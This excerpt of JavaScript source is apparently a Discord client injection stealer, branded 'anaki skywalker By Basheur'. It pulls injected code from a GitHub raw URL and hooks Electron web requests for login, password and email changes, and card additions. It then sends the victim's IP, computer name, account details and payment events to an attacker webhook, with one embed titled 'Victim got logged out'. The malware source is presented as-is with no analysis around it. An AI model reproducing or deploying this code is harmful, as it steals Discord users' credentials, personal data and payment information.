...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/Capenigma/discords/main/robot/index.js",
    webhook: "%WEBHOOK%",
...
const makeEmbed = async ({
    ...
    var params = {
        username: "anaki skywalker",
        avatar_url: "https://img.planete-starwars.com/upload/databank/1/anakin.jpg",
        content: "",
        embeds: [{
            title: title,
            ...
            author: {
                name: "anaki skywalker"
            },
            footer: {
                text: "anaki skywalker By basheur"
            },
...
const FirstTime = async () => {
    ...
    if (!token) {
        var params = await makeEmbed({
            title: "anaki skywalker mdr il la lancer de bouffon",
            fields: [{
                name: "Injection Info",
                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                inline: !1
        ...
        if (!user.avatar) var userAvatar = "https://img.planete-starwars.com/upload/databank/1/anakin.jpg"
        if (!user.banner) var userBanner = "https://static.wikia.nocookie.net/frstarwars/images/b/b0/Husband_and_wife.png/revision/latest?cb=20180211194404.jpg"
        ...
        var params = await makeEmbed({
            title: "anaki skywalker By Basheur",
            fields: [{
                name: "Injection Info",
                ...
                name: "@Copyright",
                value: `anaki skywalker By Basheur`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "anaki skywalker User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "anaki skywalker Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "anaki skywalker User Login",
                description: "anaki skywalker",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "anaki skywalker Detect Password Changed",
                    description: "anaki skywalker",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "anaki skywalker Detect Email Changed",
                    description: "anaki skywalker",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "anaki skywalker User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
